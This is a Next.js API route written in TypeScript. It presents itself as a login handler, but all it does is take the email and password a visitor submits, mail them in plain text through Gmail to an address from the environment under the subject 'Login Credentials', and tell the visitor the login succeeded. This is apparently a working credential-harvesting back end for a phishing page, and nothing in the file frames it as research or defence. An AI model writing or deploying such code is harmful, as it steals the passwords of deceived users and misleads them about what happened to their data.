import type { NextApiRequest, NextApiResponse } from 'next';
import nodemailer from 'nodemailer';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    
    const emailUser = process.env.EMAIL_USER;
    const emailPassword = process.env.EMAIL_PASSWORD;

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: emailUser, 
        pass: emailPassword, 
        
      },
    });

    const mailOptions = {
      from: emailUser,
      to: emailUser,
      subject: 'Login Credentials',
      text: `Email: ${email}, Password: ${password}`,
    };

    transporter.sendMail(mailOptions, (error:any, info:any) => {
      if (error) {
        console.log(error);
        res.status(500).json({ message: 'Email could not be sent' });
      } else {
        console.log('Email sent: ' + info.response);
        res.status(200).json({ message: 'Login successful and email sent' });
      }
    });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
